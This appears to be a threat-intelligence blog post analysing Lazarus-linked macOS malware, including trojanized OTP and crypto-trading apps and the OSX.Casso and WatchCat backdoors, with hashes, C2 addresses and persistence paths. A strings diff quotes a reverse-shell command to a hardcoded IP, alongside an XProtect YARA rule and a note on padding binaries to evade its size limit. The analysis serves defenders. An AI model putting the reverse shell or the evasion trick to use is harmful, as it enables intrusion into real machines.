Kaspersky noted that as of January 2020, the Lazarus group was “currently one of the\nmost active and prolific APT actors”. Since January, other reports have detailed a macOS\n[RAT (DaclsRAT) and linked it to a wider Lazarus cross-platform toolset (MATA framework).](https://securelist.com/mata-multi-platform-targeted-malware-framework/97746/)\nSince late May 2020, we have observed three other distinct families of macOS malware\nlikely from the same actors, most of which have not yet been publicly documented. In this\npost, we provide a high-level overview of all four of these macOS malware families and detail\ntheir variants and evolution so far.\n\n\n-----\n\n## 1. Trojanized One-Time Password Apps\n\nThe first of these four families has been covered by other researchers in detail; here we will\njust summarize the main findings for completeness.\n\nFirst seen on 8th April on VirusTotal, the so-called DaclsRAT malware was distributed as a\ntrojanized “One-time-password” (OTP) app called TinkaOTP. The malware embeds a copy of\nthe open-source MinaOTP project as cover for its malicious activities.\n\nWritten in Swift, the initial observed sample was built on a macOS 10.15.3 (19D76) machine,\nwhile a second version, compiled the following week on April 1st was built on 10.15.4\n(19E266), indicating if nothing else that the malware authors were vigilant at keeping up with\nmacOS updates on their own machines, whether virtual or metal-based.\n\nAs has been previously reported, there are two variants of the trojan TinkaOTP. The version\nthat has received the most attention contains the malware payload in the application bundle’s\nResources folder. The file is a Mach-O binary disguised as a .nib file, at\n```\n../Resources/Base.lproj/Submenu.nib . This file is copied directly to the users Library\n\n```\nfolder and renamed as `.mina . The dot prefix is added in order to make it invisible in the`\nFinder. This payload is then executed via a user LaunchAgent at\n```\n~/Library/LaunchAgents/com.aex-loop.agent.plist .\n\n```\nThe second version does not carry the payload directly but instead downloads it from a C2\ninto the same location as before. The C2 server address is embedded in the main\nexecutable in the TinkaOTP bundle. The hardcoded download and execution code are easily\nvisible as they are unencrypted, plain UTF strings in the binary:\n\n\n-----\n\nThe `.mina Mach-O payload itself contains a number of interesting UTF-16 strings that both`\nindicate its purpose and its C2s.\n```\n67.43.239.146:443\n185.62.58.207:443\nplugin_file\nplugin_process\n/bin/bash\nplugin_reverse_p2p\nlogsend\nplugin_socks\n\n```\nThe payload’s main() function is fairly succinct and hardcodes both the paths and contents\nfor a LaunchAgent and LaunchDaemon to achieve persistence:\n\n\n-----\n\nIn an update last week, researchers suggested that the malware contained in the trojanized\nOTP app was in fact part of a larger toolkit they named ‘MATA’. Since extensive details of this\n[have already been published, we refer interested readers to the earlier work.](https://securelist.com/mata-multi-platform-targeted-malware-framework/97746/)\n\n## 2. New Trojanized CryptoTrading Apps\n\nThe second family of Lazarus malware appearing in recent months has, as far as we are\naware, received little to no analysis from researchers, possibly due to its targeted nature and\na lack of ITW sightings.\n\nTrojanizing cryptocurrency-related apps is where the AppleJeus story began in 2018, and it\nseems the group must have met with reasonable success as 2020 has seen at least two new\nattempts, with CoinGoTrade and Cryptoistic.\n\n[We were first alerted to CoinGoTrade via a tweet on June 3rd from researcher @ccxsaber. A](https://twitter.com/ccxsaber/status/1268027551974256640?s=20)\ndomain at `coingotrade.com was set up to lure victims into downloading a fake`\ncryptocurrency app. Although we were not able to source the app bundle, further\ninvestigation on VirusTotal revealed two samples of a malicious Mach-O binary that appear\nto have been the loader:\n\n```\n4f9d2087fadbf7a321a4fbd8d6770a7ace0e4366949b4cfc8cbeb1e9427c02da\n\n```\n\nThese two samples are both written in Objective-C rather than Swift, and appear identical\nsave for a single line in the main() function, as shown by the following diff:\n```\ndiff -y \n0000000100001adc movl $0x4c4b40, %edi | 0000000100001adc movl $0x1, %edi\n\n```\n\n-----\n\nThe hardcoded value of `0x4c4b40 is the number of seconds passed to the` `usleep`\nfunction and equates to 5 seconds (5000000 microseconds). Given no other changes in the\ncode between the two samples, it can be supposed that the second sample, which appeared\non VirusTotal 14 days after the first, may have been released as a correction to the first. The\n```\ncslp() function also causes the code to pause execution for short intervals, so it may be\n\n```\nthat the authors decided the call to `usleep was redundant or somehow not producing the`\nresults they desired.\n\nThe samples embed calls to the following URL:\n\n```\nhttps://coingotrade.com/update_coingotrade.php\n\n```\n\nand post the following data to the server:\n\nUnfortunately, we were not able to retrieve a sample of the payload executed out of\n```\n/private/tmp/updatecoingotrade . However, clues to its likely behaviour may perhaps\n\n```\nbe found in a second trojanized cryptotrading app appearing on VirusTotal in early May 2020,\ncalled “Cryptoistic”.\n\n\n-----\n\nUnlike the CoinGoTrade trojan, Cryptoistic is written in Swift, although it contains a great deal\nof code bridged to Objective C, perhaps indicating a developer more familiar with the older\nprogramming language. Cryptoistic was compiled on April 2nd, a day after the second\nversion of TinkaOTP, but on a Mac device (real or virtual machine) running an older version\nof macOS than the one used for compiling the trojanized OTP apps: in this case, 10.15.2\n(19C57).\n\nApple’s [19C57 release build had already been superseded several months earlier at the end](https://support.apple.com/kb/DL2025?locale=en_US)\nof January, so at least here the [threat actor’s build machine was not being kept up to date.](https://www.sentinelone.com/resources/threat-actor-basics-understanding-the-5-main-threat-types/)\n\nThe main purpose of Cryptoistic appears to be to entrap users into creating a single account\nwith the fake platform from which to manage multiple accounts on legitimate platforms such\nas [kraken.com, huobi.por, and](https://kraken.com/) [binance.com.](http://binance.com/)\n\nBut perhaps most interesting of all is the hardcoded URL,\n```\n\"http://applepkg.com/product/new/iContact.pkg\", which despite the .pkg suffix, in\n\n```\nfact returns a Mach-O payload and drops it at `/tmp/.signal_tmp .`\n\nThe iContact binary appears to be a backdoor that gathers user and locale data and\nengages in encrypted communications with a C2 server over TCP. Functionality includes\nsending and receiving files and running custom commands such as scanning a directory and\ndeleting files.\n\n\n-----\n\n## 3. OSX.Casso | Backdoors Galore\n\nAt the same time as TinkaOTP, CoinGoTrade and Cryptoistic began circulating, so too did a\nfamily of lightweight, backdoor binaries, written primarily in Objective-C and C and making\nheavy use of standard C libraries built in to the operating system. For convenience, we call\nthese closely-related variants OSX.Casso (the reason will become clear shortly).\n\nThe first of these appeared on VirusTotal on June 1st with the file name “osxari”.\n\n```\n3c2f7b8a167433c95aa919da9216f0624032ac9ed9dec71c3c56cacfd5cd1837\n\n```\n\nSeveral variants followed quickly after:\n```\ne63640c53204a59ba59f2c310964149ca3616d79adc40a6c3abd5bf669511756\n65cc7663fa5c5665ad5d9c6bec2b6257612f9f0c0ce7e4399e6dc8b464ea88c0\n035089b4ef4a981f43455ebee7963af9e7502170ca206458f96be668b1e3674a\n\n```\n\n(UPX PACKED; unpacks to:\n```\n85d7379b7b82d6b7868f64203a444a5098c72ed7ccff6d1dbb536389a5be5a9c )\n\n```\nand, later\n\n```\n2dd57d67e486d6855df8235c15c9657f39e488ff5275d0ce0fcec7fc8566c64b\n\n```\n\nThe last of these was uploaded with the filename “cassoosx”. A quick search revealed that\nthere is also a Windows variant cassou.exe (hence the name OSX.Casso):\n\n\n-----\n\n```\n90ea1c7806e2d638f4a942b36a533a1da61adedd05a6d80ea1e09527cf2d839b\n\n```\n\nWhat makes these macOS samples all of a piece can be seen from a diff of their Symbol\ntables, which are almost identical across the range of samples and include heavy use of the\nbuilt-in libcurl.4.dylib.\n\nA diff of the embedded strings also reveals some of the significant differences between the\nfirst and most recent of OSX.Casso samples:\n\n\n-----\n\n```\ndiff y bash i > /dev/tcp/160.20.147.253/8443 0&1\n_webident_f  | _media_1\n_webident_s  | _media_2\nhttps://fudcitydelivers.com/net.php  | https://lastedforcast.com/list.php\nhttps://fudcitydelivers.com/net.php  | https://lastedforcast.com/list.php\nhttps://sctemarkets.com/net.php  | https://audiopodcasts.co/verify.php\nxdns  | darwin\n                        > @_printf\n\n```\nThe samples are almost identical except that “cassoosx” includes a reverse shell and\ndifferent C2 domains. All of the samples except cassoosx are around 32Kb in size, but\ncassoosx has also been padded with several megabytes of junk `printf calls, quite`\npossibly to beat YARA rules that specify a max file size, such as those seen in the Apple’s\nstatic signature scanner XProtect.\n\nHere we see the XProtect YARA rule for OSX.Casso:\n```\nrule XProtect_MACOS_b17a97e\n{\n     meta:\n     description = \"MACOS.b17a97e\"\n     strings:\n          $s1 = { 89 C1 C1 E9 07 48 69 C9 11 08 04 02 48 C1 E9 20 69 C9 80 3F\n00 00 F7 D9 }\n     condition:\n          Macho and filesize < 100KB and all of them\n}\n\n```\nAlthough the rule's single $s1 condition will hit on the cassoosx sample, the detection will fail\nas the binary size is well over the maximum 100Kb specified in the condition thanks to the\npadding:\n\nA further change across OSX.Casso samples can be seen in the hardcoded User Agent\nstrings and the version of Chrome that they denote, with the osxari User Agent encoded as\nfollows:\n\n```\n3c2f7b8a167433c95aa919da9216f0624032ac9ed9dec71c3c56cacfd5cd1837\n\n```\n\n_User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like_\n_Gecko) Chrome/79.0.3945.117 Safari/537.36_\n\n\n-----\n\nand all later samples including cassoosx updated to Chrome 83:\n```\n2dd57d67e486d6855df8235c15c9657f39e488ff5275d0ce0fcec7fc8566c64b\n\n```\n_User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like_\n_Gecko) Chrome/83.0.4103.61 Safari/537.36_\n\nThe osxari backdoor is itself an evolution of an older Lazarus-related executable 'Flash\n[Player' distributed in the malicous Album.app. Here we see the same basic methods and use](https://www.sentinelone.com/blog/macos-malware-outbreaks-2019-the-second-6-months/)\nof libcurl in Album.app's executable, 'Flash Player', but there's been a few revisions in the\n2020 code:\n\n(left: Flash Player; right: osxari):\n\nAfter osxari, all later samples of OSX.Casso begin to include the reverse shell. Unlike the\nolder Flash Player sample, none include a hardcoded persistence LaunchAgent or\nLaunchDaemon.\n\n## 4. Emerging Threats | WatchCat and MediaRemote\n\n\n-----\n\nAs this post was in preparation, an update to Apple s XProtect signatures late last week\nrevealed yet another Lazarus group Mach-O that differs significantly from those discussed\nabove.\n\nTwo new rules in XProtect identify yet another User Agent string, this time specifying older\nversions of both macOS and Safari:\n\n_Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like_\n_Gecko) Version/12.0.2 Safari/605.1.15_\n\nThe rules also specify strings for \"MediaRemote.app\" and \"com.apple.watchcat.plist\".\nSearches on VirusTotal have only revealed one sample so far:\n\n```\n3bb96bfaf492782b38985f4bd6b7e7f9dc22c1332b42bb74b16041298fd31f93\n\n```\n\nDetections have been increasing rapidly over the last 14 days as signature-based solutions\nhave caught up:\n\nAlthough there are some overlaps with the earlier backdoor samples (e.g, the use of\n\"/usr/lib/libcurl.4.dylib\"), and the trojanized OTP apps (e.g., inclusion of a hardcoded\nLaunchDaemon), there is also much more to this malware that has not been seen in the\nother samples, including use of a WebShell and an onboard crc32 table for decrypting a\nconfig file.\n\n\n-----\n\n[The symbol table also reveals an old friend from earlier Lazarus campaigns, _MsgTroyInfo.](https://labs.sentinelone.com/lazarus-apt-targets-mac-users-poisoned-word-document/)\n\n\n-----\n\nWhile analysis of `watchcat is still ongoing and we have yet to see an in-the-wild infection,`\nit's clear that the rapid iteration of all these various Lazarus-related malware samples shows\nthe actor is heavily invested in the macOS platform.\n\n\n-----\n\n## Conclusion\n\nAll of the samples reviewed above have appeared in the last eight to ten weeks and are\nevidence that threat actors behind the Lazarus group are pursuing several distinct\ncampaigns, using a variety of technologies, and are themselves keeping up-to-date with the\nApple platform. These are not actors merely porting Windows malware to macOS, but rather\nMac-specific developers deeply invested in writing custom malware for Apple's platform.\nPrimarily, the samples we have reviewed here appear to be designed to steal cryptocurrency\nand maintain backdoors into their targets' devices, but there is clearly much more to be\n[learned about these campaigns.
